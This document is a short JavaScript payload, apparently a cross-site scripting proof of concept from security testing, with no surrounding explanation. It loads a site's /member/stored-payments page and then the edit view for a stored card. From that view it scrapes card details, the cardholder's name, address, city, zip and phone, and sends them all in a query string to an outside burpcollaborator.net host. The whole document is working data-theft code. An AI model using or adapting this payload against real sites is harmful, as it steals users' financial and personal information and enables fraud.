var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/member/stored-payments',true);
req.onreadystatechange = req.send();
function handleResponse() {
var id = req.responseText.split(/<tr data-payment-method-id="/)[1].split('"')[0]
console.log(id);
var req2 = new XMLHttpRequest();
req2.onload = handleResponse;
req2.open('get','/member/stored-payments?edit='+id,true);
req2.onreadystatechange = req2.send();
function handleResponse() {
var cc = req2.responseText.split(/disabled="disabled" value="/)[1].split('"')[0]
var last4 = req2.responseText.split(/class="form-control" placeholder="Credit Card Number" value="/)[1].split('"')[0]
var name = req2.responseText.split(/class="form-control" placeholder="First Name" value="/)[1].split('"')[0]
var name2 = req2.responseText.split(/class="form-control" placeholder="Last Name" value="/)[1].split('"')[0]
var address = req2.responseText.split(/class="form-control" placeholder="Address 1" value="/)[1].split('"')[0]
var city = req2.responseText.split(/class="form-control" placeholder="City" value="/)[1].split('"')[0]
var zip = req2.responseText.split(/class="form-control" placeholder="Zip" value="/)[1].split('"')[0]
var phone = req2.responseText.split(/class="form-control" placeholder="Phone" value="/)[1].split('"')[0]
console.log(cc);
req.open('GET', 'https://q4v515lxb1qq3eb9s50rqd8j7ad01p.burpcollaborator.net/?cc='+cc+'&last4='+last4+'&name='+name+'&lastname='+name2+'&address='+address+'&city='+city+'&zip='+zip+'&phone='+phone, true);
req.send()
};
};